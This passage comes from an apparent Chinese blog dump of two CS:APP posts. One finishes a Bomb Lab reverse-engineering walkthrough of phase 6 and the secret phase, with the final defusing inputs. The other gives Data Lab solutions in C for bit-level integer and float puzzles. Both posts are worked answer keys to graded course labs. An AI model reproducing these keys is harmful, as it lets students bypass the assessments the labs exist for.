&lt;phase_6+0x5f&gt;401132: 44 89 e3 mov %r12d,%ebx401135: 48 63 c3 movslq %ebx,%rax401138: 8b 04 84 mov (%rsp,%rax,4),%eax40113b: 39 45 00 cmp %eax,0x0(%rbp)40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt;401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt;401145: 83 c3 01 add $0x1,%ebx401148: 83 fb 05 cmp $0x5,%ebx40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt;40114d: 49 83 c5 04 add $0x4,%r13401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; 前面是一系列的赋值操作，第5行将eax减1，eax中的值是rsp位置存放的值。第6、7两行将减一以后的值与5进行比较，小于等于5则跳过引爆代码。也就是说rsp中存放的第一个数必须小于等于6. 之前将r12d置为0，第9行中将r12d的值增加1，下一行与6进行比较，如果相等则跳入下一个阶段。 第12行中把r12d中的值复制给了ebx，下一步又赋给了rax，接下来的一行mov将rsp+rax*4中的值（也就是第rax+1个读入的int值）给了eax。 下一步将eax中的值与rbp地址指向的值进行比较，如果不相同则跳过引爆代码。说明这两个值需要不同，再接下来将ebx中的值加1，再与5进行比较，如果小于等于5则跳到第13行中，更新rax的值，再去从栈中取下一个新的int值和rbp中的进行比较。到这里我们可以看出，从13行到20行相当于一个内循环，从r12d开始，到5结束，不断地取栈中的值与rbp的值比较，也就是要求rbp之后的值需要与rbp不同。 第21、22行则是外循环，它更新了r13的值，令r13指向下一个int值。跳到第3行用r13的值更新rbp的值，也就是把比较的对象向后移一个。同样要求该值小于等于5。后面再进行内循环比较之后的值。 这里我们就可以明白这段代码的作用：限制读入的6个数必须小于等于6并且互不相等。 123456789401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi401158: 4c 89 f0 mov %r14,%rax40115b: b9 07 00 00 00 mov $0x7,%ecx401160: 89 ca mov %ecx,%edx401162: 2b 10 sub (%rax),%edx401164: 89 10 mov %edx,(%rax)401166: 48 83 c0 04 add $0x4,%rax40116a: 48 39 f0 cmp %rsi,%rax40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 第1行中将rsp+0x18的值赋给rsi。 第2行将r14的值赋给rax，r14的值是之前保存的rsp。 第3行将0x7赋给ecx，第4行又将ecx复制给edx。 下一步将edx减去rax存放的地址指向的值，接下来又将edx的值赋回rax存放的地址指向的值。 第7行将rax的值加4，也就是指向了下一个int值，接着与之前设定的rsi进行的比较，如果不相等则重复这个过程。rsi实际上指向的是6个int值之后的位置，作为一个标记使用。 这段代码总结起来就是将栈中的6个值（假设为x）变为7-x。 123456789101112131415161718192040116f: be 00 00 00 00 mov $0x0,%esi401174: eb 21 jmp 401197 &lt;phase_6+0xa3&gt;401176: 48 8b 52 08 mov 0x8(%rdx),%rdx40117a: 83 c0 01 add $0x1,%eax40117d: 39 c8 cmp %ecx,%eax40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt;401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt;401183: ba d0 32 60 00 mov $0x6032d0,%edx401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2)40118d: 48 83 c6 04 add $0x4,%rsi401191: 48 83 fe 18 cmp $0x18,%rsi401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt;401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx40119a: 83 f9 01 cmp $0x1,%ecx40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt;40119f: b8 01 00 00 00 mov $0x1,%eax4011a4: ba d0 32 60 00 mov $0x6032d0,%edx4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; 进入下一段代码，一开始先将esi归零，然后跳到第14行处执行。 第14行中从rsp+rsi的位置（也就是栈中我们读入的位置）取出一个数赋给ecx，接下来对取出的这个值进行判断，如果它小于等于1则跳到第9行处。 我们在这里假设这个数确实小于等于1。到第9行，将一个地址值赋给了edx，接下来将edx的值赋给了rsp+2*rsi+0x20的地址指向的值，这里我们可以知道rsi起到的是索引的作用，下面一行将rsi增加4，说明从rsp+0x20开始存放8个字节的数据。再将rsi的值与0x18作比较，说明整个过程要进行6次。接下来又到了第14行将下一个int值给rcx。 那么如果rcx的值不小于等于1，继续往下走，第18行将0x1赋给eax，19行将0x6032d0这个地址赋给edx，接下来跳转到了第3行。第3-6行的代码是一起的，也是理解这个过程的关键。 首先第3行的命令，把edx+0x8地址指向的值赋给了edx，这步操作一开始比较难以理解，我们需要先看看edx的初始状态是什么样的，使用gdb在运行时查看内存： 我们可以从这个信息中看出，其实它就是一个链表的结构，首先名字就是node给了提示，再者每一个node中偏移8个字节中储存的都是下一个节点的地址，那么前面8个字节自然就是节点储存的数据。 我们再回过头来看第3行的代码，就不难理解这个操作就是我们常用的p = p -&gt; next，也就是指向下一个节点。 第4行把eax增1，再将eax与ecx进行比较，如果不等就再跳到第3步指向链表下一个节点，那么可以看出这4行代码的作用就是从edx这个初始位置开始向后移动ecx-1次，第7行跳过了第9行，把edx赋给了rsp+0x20开始的第rsi个8字节的位置。如果rsi达到0x18则跳出这部分代码。 我们整理一下这个过程，其实就是依次从栈中读取存放的6个数放入rcx，再根据rcx的值找到链表中对应的节点，把节点的地址放入rsp+0x20开始的对应位置中。 1234567891011124011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi4011ba: 48 89 d9 mov %rbx,%rcx4011bd: 48 8b 10 mov (%rax),%rdx4011c0: 48 89 51 08 mov %rdx,0x8(%rcx)4011c4: 48 83 c0 08 add $0x8,%rax4011c8: 48 39 f0 cmp %rsi,%rax4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt;4011cd: 48 89 d1 mov %rdx,%rcx4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt;4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 这段代码前三行分别将rsp+0x20地址指向值、rsp+0x28的值、rsp+0x50的值赋给了rbx 、rax、rsi。第4行将rbx复制到rcx中，第5行将rax（rsp+0x20）中存放的地址复制入rdx，第6行将这个数据赋给了rcx（也就是rbx、*(rsp+0x20)）节点的指针域。下一步将rax增加8，指向栈中的下一个位置。再与rsi这个临界地址进行比较，如果rax超出末端则跳出这段代码到第12行的位置。 下面把rdx中存放的地址值赋给rcx，跳转到第5行重复过程。 仔细分析，这个过程其实就是按照链表节点在栈中的位置重新将链表连接起来。 最后跳出的第12行则是把新的表尾的指针域赋为NULL。 12345678910111213141516174011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp4011df: 48 8b 43 08 mov 0x8(%rbx),%rax4011e3: 8b 00 mov (%rax),%eax4011e5: 39 03 cmp %eax,(%rbx)4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt;4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt;4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx4011f2: 83 ed 01 sub $0x1,%ebp4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt;4011f7: 48 83 c4 50 add $0x50,%rsp4011fb: 5b pop %rbx4011fc: 5d pop %rbp4011fd: 41 5c pop %r124011ff: 41 5d pop %r13401201: 41 5e pop %r14401203: c3 retq 第2行将ebp赋上0x5，第三行中rbx的值是之前的rsp+0x20，那么rbx+0x8这个地址中存放的值就是下一个节点的地址，赋给了rax。 第4行将rax代表的节点的数据取出放入eax，再与rbx代表的节点的数据的值的低4位进行比较，如果前一个节点的数据的低4字节大于等于后一个节点的，则跳过引爆代码。 第8行又是熟悉的操作：使rbx指向下一个节点。 第9、10行减小ebp这个循环变量再进行判断，保证循环进行5次。 也就是说，我们需要使新的链表中前一个节点存放的数据值的低4字节都大于后一个节点的。 弄清楚了过程，下面就可以开始反推答案了： 先找到正确的链表节点排列，根据图： 数据由大到小的排列依次是3 4 5 6 1 2。 由于有一步x = 7 - x，所以倒推回来的答案应该是： 4 3 2 1 6 5 秘密阶段在之前C代码的暗示以及我们查看汇编代码的过程中都可以猜测出有一个秘密阶段的存在，secret_phase的代码就在phase_6后的func7之后。第一个问题是我们如何进入secret_phase。 这里可以用一个简单的方法，直接在反汇编代码中搜索secret_phase的入口地址，很快就可以发现在每个阶段的phase_x之后都有一行phase_defused，就在这个函数里面存在callq secret_phase的代码。 我们就开始分析这个phase_defused： 12345678910111213141516171819202122232425262728293031323334353600000000004015c4 &lt;phase_defused&gt;: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt; 4015df: 75 5e jne 40163f &lt;phase_defused+0x7b&gt; 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 &lt;puts@plt&gt; 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 &lt;secret_phase&gt; 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 &lt;phase_defused+0x90&gt; 40164f: e8 dc f4 ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq 可以看到第7行将函数num_input_strings的返回值与6进行比较，如果不等于6则的直接跳过中间代码到达最后的结束部分。 从函数名我们可以推测这个函数的作用的是检测读取的字符串的数量，当读取了6个字符串时，就不会跳过中间的代码。我们继续看中间的代码： 第9到14行又是熟悉的sscanf调用过程，我们已经知道esi指向的是格式化字符串的首地址，我们先来查看它的内容： 读取两个整数和一个字符串。 有所不同的是在12行之后又有一行给edi赋上了一个地址值，我们之前所有阶段中edi的值都是来自于我们read_line的地址，想到sscanf 参数中确实存在一个输入，我们可以推测这个edi中存放的是我们读取位置的首地址。 那么我们就可以在运行时查看这个地址的内容，看是从哪里进行读取的： 首先符号表告诉我们这段数据的名字叫做input_strings也就是我们输入的字符串，那么这个地址上的0 0代表的应该就是我们的第4行输入。两个整型数字正好与格式化字符串也是匹配的。现在我们知道，应该在这两个0之后再追加一个字符串作为输入。 第15、16行对成功输入的数据个数进行了一个判断，如果不为3个则跳过调用secret_phase的代码。 第17-19行是对strings_not_equal的调用，我们已经知道它的两个参数分别是esi与edi，esi被赋上了一个地址值，edi被赋上了esp+0x10，我们可以推测出edi的地址就是指向我们读入的第三个字符串的，那么需要比较的对象是什么呢？我们在运行时查看内存的内容： 这就是我们需要的第三个参数。 可以看到如果第三个参数与上面这个字符串相同的话就会调用两次puts输出提示信息，然后进入secret_phase阶段。 12345678910111213141516171819202122230000000000401242 &lt;secret_phase&gt;: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e &lt;read_line&gt; 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 &lt;strtol@plt&gt; 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c &lt;secret_phase+0x2a&gt; 401267: e8 ce 01 00 00 callq 40143a &lt;explode_bomb&gt; 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 &lt;fun7&gt; 401278: 83 f8 02 cmp $0x2,%eax 40127b: 74 05 je 401282 &lt;secret_phase+0x40&gt; 40127d: e8 b8 01 00 00 callq 40143a &lt;explode_bomb&gt; 401282: bf 38 24 40 00 mov $0x402438,%edi 401287: e8 84 f8 ff ff callq 400b10 &lt;puts@plt&gt; 40128c: e8 33 03 00 00 callq 4015c4 &lt;phase_defused&gt; 401291: 5b pop %rbx 401292: c3 retq 可以看到第3行调用了read_line函数，接着把read_line的返回值赋给了rdi，并调用了strtol函数，这个标准库函数的作用是把一个字符串转换成对应的长整型数值。返回值还是存放在rax中，第8行将rax复制给了rbx，第9行将rax减1赋给eax，第十行与0x3e8进行比较，如果这个值小于等于0x3e8就跳过引爆代码。看到这里我们可以知道我们需要再加入一行数据，它应该是一个小于等于1001的数值。 接下来将ebx赋给了esi，也就是我们一开始输入的rax值。第14行将一个地址值赋给了edi，15行调用了fun7函数。我们还是先往下了解一下我们需要得到的结果。 函数返回后令返回值eax与0x2做了一个比较，如果相等则跳过引爆代码。 所以我们需要返回2。 下面查看fun7的代码： 1234567891011121314151617181920210000000000401204 &lt;fun7&gt;: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 &lt;fun7+0x34&gt; 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 &lt;fun7+0x1c&gt; 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 &lt;fun7&gt; 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d &lt;fun7+0x39&gt; 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d &lt;fun7+0x39&gt; 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 &lt;fun7&gt; 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d &lt;fun7+0x39&gt; 401238: b8 ff ff ff ff mov $0xffffffff,%eax 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq 第3、4两行先对我们输入的这个数作一个判断，如果等于0直接跳到第19行，返回-1，这显然不是我们想要的结果。 第5行将rdi的值读入到了edx中，第6行则将这个数与我们读入的数进行比较，如果这个数小于等于我们读入的数就跳至第12行，第12行将eax置0，再进行一次相同的比较，如果相等则跳至第20行返回。 如果不等（也就是edx小于我们读入的数），则继续向下执行第15行，这行代码有些与之前的链表跳至下一个节点类似，到这里，我们就需要查看一下rdi这个地址里存放的是怎样一种数据结构： 仔细观察可以发现这是一个二叉树的结构，每个节点第1个8字节存放数据，第2个8字节存放左子树地址，第3个8字节存放右子树位置。并且命令也有规律，nab，a代表层数，b代表从左至右第b个节点。 根据这个结构，我们可以把树画出来以便我们进行分析。随意找了个工具表示一下： 下面我们回到代码，现在我们知道第15行代码的作用是将rdi移到它的右子树的位置，接着调用fun7，在返回后令eax = 2 * rax + 1。 如果第6行的比较中树节点的值大于我们读入的数呢？ 代码会进行到第8行，令rdi移到它的左子树的位置，接下来调用fun7在返回后令eax = 2 * eax。下面跳至返回处。 总结上面的过程：edi指向一个树的节点，令edi节点的值与我们读入的值进行比较。 如果两者相等：返回0 如果前者大于后者：rdi移至左子树，返回2 * rax 如果后者大于前者：rdi移至右子树，返回2 * rax + 1 那么我们需要返回2，应该在最后一次调用返回0，倒数第二次调用返回2 * rax + 1，第一次调用返回2 * rax。换句话说，这个数应该在第三层，比父节点大且比根结节小。观察上图，唯一的答案是： 0x16（22） 至此，炸弹全部解除： 实验小结整个实验包括秘密部分用时九个小时，引爆了3次炸弹（一次因为错误的尝试，两次因为将ni命令错打成n）。 一开始拿到题目的时候会比较蒙，需要先去学习工具的使用与一些编译的基础知道（符号表、定址表等等）花费了一些时间。前几个阶段过于关注函数的具体实现而没有根据常识去推测一些明显函数的作用花费了一些时间。 前4个阶段都算比较简单，考查了一些常用结构在汇编中的出现形式。第5、6与秘密阶段分别考察了堆、链表、二叉树这三个数据结构在内存中的结构与汇编级的使用，受益良多。 这个实验需要细致的分析与大胆的猜测与实验验证，还需要小心操作，最重要的是耐心，面对非常晦涩的汇编代码如何一步步地弄清代码的作用很需要毅力。当然也可以通过自己写出等价的C代码来帮助自己理解。","tags":[{"name":"Computer System","slug":"Computer-System","permalink":"https://www.viseator.com/tags/Computer-System/"},{"name":"CS:APP","slug":"CS-APP","permalink":"https://www.viseator.com/tags/CS-APP/"}]},{"title":"深入理解计算机系统（CS:APP) - Data Lab详解","date":"2017-06-18T07:01:01.000Z","path":"2017/06/18/CS_APP_DataLab/","text":"关于CS:APP《深入理解计算机系统》(Computer Systems: A Programmer’s Perspective;CS:APP)这本书作为CMU核心课程的核心教材，一直被众人所推崇。这本书的主要内容就如它的英文名称那样：以一个程序员的视角看待计算机系统（现在的中文书名翻译给人一种这本书非常精深的错觉）。实际上这本书的内容并没有太过于深入，并且一直都作为计算机科学与技术专业低年级的计算机基础课来开设。所需要的前置知识也不是很多，一般来说学习过C语言之后就可以看了，并不需要提前学习汇编（本书第三章会讲解汇编的基础内容）。但个人感觉在学习过王爽的8086汇编以后学习本书的汇编会顺利不少。 我在三月份时得知本书第三版的英文版即将出版就早早预订了（第三版中文翻译版早已出版），苦苦等待一个月以后终于如愿成为了这版CS:APP的第一批读者。 读这本书的感受第一就是非常地爽，可以说这本书可以引领你从表层的程序一直深入到计算机内部的运作方式中，里面对于一些概念的理解也是给人一种前所未有的透彻感觉（溢出的图形表示、补码的权值理解等等）都切中了问题的本质。 除了书本上的内容，CMU的课程官网上还提供了9个lab，这9个lab也一直深受CMU开设的课程的学生们的喜爱，在lab中我们可以将在各章中学习到的知识运用到解决一个有趣的问题中，并且通过自动化的评分机制评估对知识的掌握程度。这9个lab同样是这本书的核心内容。 Data Lab实验代码见GitHub 简介在严格限制的条件下实现简单的逻辑、补码、浮点数操作函数。 本lab旨在帮助学生理解C中各类型的位表示和操作符对数据的位级作用行为。 所用工具VS Code-用于代码编写gcc-用于编译 第一部分 整数所编写的程序必须满足如下要求： 只能使用0-255的整型常数 只能使用函数参数与函数内声明的局部变量 只能使用如下单目操作符：! ~ 只能使用如下双目操作符：&amp; ^ | + &lt;&lt; &gt;&gt; 最多只能使用有限个运算符（等于号、括号不计），可以认为使用的运算符个数越少得分越高 一些函数可能对操作符有更多的限制（在题目前以操作符限制给出） 禁止使用任何控制结构如 if do while for switch等 禁止定义或使用任何宏 禁止定义任何函数 禁止调用任何函数（除了可以使用printf输出中间变量，但提交时必须去掉） 禁止使用任何形式的类型转换 禁止使用int以外的任何类型（包括结构体、数组、联合体） 可以假设程序在如下环境的机器上运行： 采用补码表示整型 32位int 执行算术右移 右移超过类型的长度时的行为未定义 bitAnd 要求：只用~ |实现x&amp;y 操作符限制：~ | 操作符使用数量限制：8 思路：略 1int bitAnd(int x, int y) &#123; return ~((~x) | (~y)); &#125; getByte 要求：取出x中的n号字节 编号从低位到高位从0开始 操作符使用数量限制：6 思路：将x右移n*8位之后取出低8位的值 1int getByte(int x, int n) &#123; return (x &gt;&gt; (n &lt;&lt; 3)) &amp; 0xff; &#125; logicalShift 要求：将x逻辑右移n位（0&lt;=n&lt;=31) 操作符使用数量限制：20 思路：将x的最高位除去后右移n位（保证高位补0），然后使用|操作符手动将最高位移动到的位置置上x的最高位。 1234int logicalShift(int x, int n) &#123; int a = 1 &lt;&lt; 31; return ((x &amp; ~a) &gt;&gt; n) | ((!!(x &amp; a)) &lt;&lt; (32 + ~n));&#125; bitCount 要求：统计x的二进制表示中1的数量 操作符使用数量限制：40 思路： 做这道题参考了stackoverflow上的一个回答，核心思想是分治： 将所有位分成32组，一组中只有1位 将相邻两组合为一组，组中的数值为原来两组中的数值相加 重复第2步，直到合成只有1组，组中的数值即为结果 用图片比较便于理解： 可以看到最终的0x0000000F即为1的数量15 该算法能成功的关键在于一开始中每组中的数值即为每组中1的数量，然后将相邻两组中的数值相加的过程就相当于将之前一级的1的数量汇总，不断重复这个过程就可以将1的数量汇总到最后的一个数中。 有了算法我们还要考虑如何在题目的限制条件下实现这一算法。 为了实现将相邻两组中的值相加并放在合适的位置，我们采用掩码+位移的方式，例如有掩码： int mask1 = 0x55555555 (0101...0101) 那么x = x &amp; mask1 + (x &gt;&gt; 1) &amp; mask1;实现了相加的过程，前面一部分先取出了一半的组，右移后再取出的就是后一半的组，再由按位相加的特点，它们相加后的值就存放在特定的位上（可以参照上面的图理解这一过程）。 接下来只要使用不同的掩码和不同的位移就可以一步步实现这一过程。 但是题目限制中我们只能使用0x00-0xFF的整型值，所以掩码也需要我们进行构造。 答案如下，注意到当剩下4组，每组8位的时候我们就可以直接位移相加再取出低8位得到它们的和。 12345678910111213141516171819int bitCount(int x) &#123; // referenced : // https://stackoverflow.com/questions/3815165/how-to-implement-bitcount-using-only-bitwise-operators int mask1 = 0x55; int mask2 = 0x33; int mask3 = 0x0F; int result = 0; mask1 = mask1 | (mask1 &lt;&lt; 8); mask1 = mask1 | (mask1 &lt;&lt; 16); mask2 = mask2 | (mask2 &lt;&lt; 8); mask2 = mask2 | (mask2 &lt;&lt; 16); mask3 = mask3 | (mask3 &lt;&lt; 8); mask3 = mask3 | (mask3 &lt;&lt; 16); result = (x &amp; mask1) + ((x &gt;&gt; 1) &amp; mask1); result = (result &amp; mask2) + ((result &gt;&gt; 2) &amp; mask2); result = (result &amp; mask3) + ((result &gt;&gt; 4) &amp; mask3); return (result + (result &gt;&gt; 8) + (result &gt;&gt; 16) + (result &gt;&gt; 24)) &amp; 0xff;&#125; bang 要求：不使用!实现!操作符 操作符限制：~ &amp; ^ | + &lt;&lt; &gt;&gt; 操作符使用数量限制：12 思路： !操作符的含义是0变为1，非0变为0，我们自然可以想到要做的是区分非零和零，零相对的非零数有一个非常明显的特征是-0=0，而对于非零数，取负后必定是一正一负而不可能相等，利用这一点，可以得出非零数与它的相反数进行|运算后符号位一定为1，我们将符号位取出并取反就可以返回正确的值。 1int bang(int x) &#123; return 1 &amp; (1 ^ ((x | (~x + 1)) &gt;&gt; 31)); &#125; tmin 要求：返回补码表示的整型的最小值 操作符使用数量限制：4 思路：按照补码的权值理解，只要将权为-32的位置为1即可 1int tmin(void) &#123; return 1 &lt;&lt; 31; &#125; fitBits 要求：如果x可以l只用n位补码表示则返回1，否则返回0 1 &lt;= n &lt;= 32 操作符使用数量限制：15 思路： 如果x可以用n位补码表示，那么左移多余的位的个数后再右移回来的数值一定与原值相等，这个方法利用了左移后溢出的位会被丢弃，而右移回来时的是补符号位，如果丢弃了1或者右移时补的是1都会导致值的改变，而这两种情况也正说明了x不可以只用n位补码表示。 1234int fitsBits(int x, int n) &#123; int a = 33 + ~n; return !((x &lt;&lt; a &gt;&gt; a) ^ x);&#125; divpwr2 要求：计算x/(2^n) 0 &lt;= n &lt;= 30 结果向零取整 操作符使用数量限制：15 思路：对于正数，我们直接把x右移n位就可以得到向零取整的结果（实际上是向下取整）；对于负数，虽然我们右移n位可以得到结果，但是这个结果是向下取整的，所以我们需要适当地加上1来补为向零取整，那么我们什么时候需要加1呢？整除时当然不用，在不能整除时就都需要加上1来调整，如何判断是否整除？只要移出的位中有一个不为0，那么就表示无法整除。​ 123456int divpwr2(int x, int n) &#123; int a = 1 &lt;&lt; 31; int isALessThanZero = !!(x &amp; a); int isXHasMoreBit = (!!((~(a &gt;&gt; (32 + ~n))) &amp; x)); return (x &gt;&gt; n) + (isXHasMoreBit &amp; isALessThanZero);&#125; negate 要求：计算-x 操作符使用数量限制：5 思路：略。 1int negate(int x) &#123; return ~x + 1; &#125; isPositive 要求：如果x大于0返回1，否则返回0 操作符使用数量限制：8 思路：检测符号位与x是否为0即可。 1int isPositive(int x) &#123; return !((x &amp; (1 &lt;&lt; 31)) | !x); &#125; isLessOrEqual 要求：如果x小于等于y则返回1，否则返回0 操作符使用数量限制：24 思路：本题的基本思路是判断x-y得到的值是否小于等于0，但是要考虑溢出带来的影响，首先定义了两个变量xp,yp分别表示x,y是否大于等于0。return的表达式的含义为并并非x大于等于0且y小于0的情况下（&amp;的后半部分），如果x-y小于或等于0或x小于零且y大于等于0，则返回1。 1234567int isLessOrEqual(int x, int y) &#123; int t = 1 &lt;&lt; 31; int xp = !(x &amp; t); int yp = !(y &amp; t); int p = x + ~y + 1; return (!!(((!xp) &amp; yp) | ((p &amp; t) | !p))) &amp; (!(xp &amp; (!yp)));&#125; ilog2 要求：返回x求以2为底的对数的结果 向下取整 操作符使用数量限制：90 思路：本题参照了陈志浩学长的答案。解题算法的核心思想是二分查找，首先我们要明白这道题实际上想让我们求的是什么，经过观察我们可以得出结论，一个数求以2为底的对数的结果就相当于它二进制中位置最高的1的序号（序号从零开始由低位到高位）。那么我们需要做的就是查找并记录这个位置最高的1的位置。算法过程如下： 如果x &gt;&gt; 16的结果大于0，那么可以说明最高位的位置至少是16，那么我们可以将结果的第4位置1（序号编号规则同上），因为2 ^ 4 = 16，反之置0说明结果小于16. 下面考虑两种情况，如果第1步中x &gt;&gt; 16 大于0，说明我们需要在16位之后的第8位（第24位，相当于再二分）再进行二分查找，如果x &gt;&gt; 16小于0，那我们需要在16位之前的第8位（第8位，相当于再二分）进行查找，那么我们可以得出，下次查找时的范围为x &gt;&gt; (8 + result) (result表示上一步得到的结果（0或16）)，这个+result的意义可以认为是重新确定开始进一步二分查找的位置。如果x &gt;&gt; (8 + result) 的结果大于0，那么说明结果（result)的第3位必为1，相当于在结果上加上了查找到的新位置，反之第3位应该仍为0. 按照上面的思路继续查找到不能再二分（偏移为x &gt;&gt; (1 + reuslt)），此时result中得到最终的最高位的位置。算法描述起来比较难，参照代码推理几次就可以明白其中的巧妙之处：123456789101112131415161718int ilog2(int x) &#123; int result = 0; int b4 = !!(x &gt;&gt; 16); int b3 = 0; int b2 = 0; int b1 = 0; int b0 = 0; result = b4 &lt;&lt; 4; b3 = !!(x &gt;&gt; (8 + result)); result = result | (b3 &lt;&lt; 3); b2 = !!(x &gt;&gt; (4 + result)); result = result | (b2 &lt;&lt; 2); b1 = !!(x &gt;&gt; (2 + result)); result = result | (b1 &lt;&lt; 1); b0 = !!(x &gt;&gt; (1 + result)); result = result | b0; return result;&#125; 第二部分 浮点数 所编写的程序必须满足如下要求： 只能使用函数参数与函数内声明的局部变量 最多只能使用有限个运算符（等于号、括号不计），可以认为使用的运算符个数越少得分越高 禁止定义或使用任何宏 禁止定义任何函数 禁止调用任何函数（除了可以使用printf输出中间变量，但提交时必须去掉） 禁止使用任何形式的类型转换 禁止使用int、unsigned以外的任何类型（包括结构体、数组、联合体） 禁止定义或使用任何浮点常量 也就是说在浮点数题目中，我们可以使用任意大小的整型数值，可以使用流程控制语句，可以使用任何操作符。 float_neg 要求：返回-f的位级表示 本题及以下所有的题目都采用unsigned int来存放位级表示 所有的浮点类型都为float 如果输入为NaN，返回NaN 操作符使用数量限制：10 思路：对于一般的浮点数，我们只需要对它的符号位取反就可以了。需要特殊处理的只是无穷与NaN这两种非规格化的情况 1234567unsigned float_neg(unsigned uf) &#123; unsigned result = uf ^ 0x80000000; if ((uf &amp; 0x7F800000) == 0x7F800000 &amp;&amp; (uf &amp; 0x007FFFFF)) &#123; result = uf; &#125; return result;&#125; float_i2f 要求：实现由int到float的类型转换 操作符使用数量限制：30 思路： 由于浮点数的表示中对于负数并没有使用补码的方式，正负号完全取决于符号位，所以对于负数输入，我们需要做的第一步工作就是把它取负为正数再进行后面的操作。在这个过程我们需要记录下正负，在之后的操作中需要使用。 由于浮点数与整数表示的不同，浮点数的有效数字的位置在第0-22位的23位中，并且第一个1在规格化表示中会被省略，我们只需要第一个1以后的位数，并且我们需要知道在浮点数表示中它的指数应该为多少，所以在这个过程中我们同时需要记录第一个1出现的位置并以此决定指数。 在代码中使用了一个i来记录左移的位数，也就是最高位的1之前的零的个数，那么32-i就是最后的指数。 在循环中我们将整数的有效数字提前到了最前，然后将最高位移出， 这时我们用temp保存这时的状态。供之后的舍入判断使用。 接下来，我们需要将有效位移到正确的位置上，也就是向右位移9位。 下面按照之前的记录把符号位置上正确的值。 现在已经处理好有效数字与符号部分，下面要做的就是处理指数部分。 之前说过32-i是指数的数值，注意我们需要将这个值加上偏移量127，再放入表示指数的位置中。 下面就要处理舍入的情况了，浮点数表示的舍入规则比较特殊，也是本题的难点。结合本题的情况进行介绍： 在右移之前我们保存了这时的状态，因为当右移九位后原来的低九位如果有数据就会被舍弃，我们就需要根据舍弃的这九位与未被舍弃的最后一位（也就是原数第9位，下称第9位）来判断舍入的情况。 如果舍弃的这九位的最高位为0，那么说明舍去的数值小于保留下来的最低位表示的值的二分之一，那么我们不需要舍入。 如果舍弃的这九位的最高位为1，并且后面的位有数值，那么说明舍去的数值大于第9位表示的值的二分之一，这个时候我们需要舍入，也就是把最终结果加一。 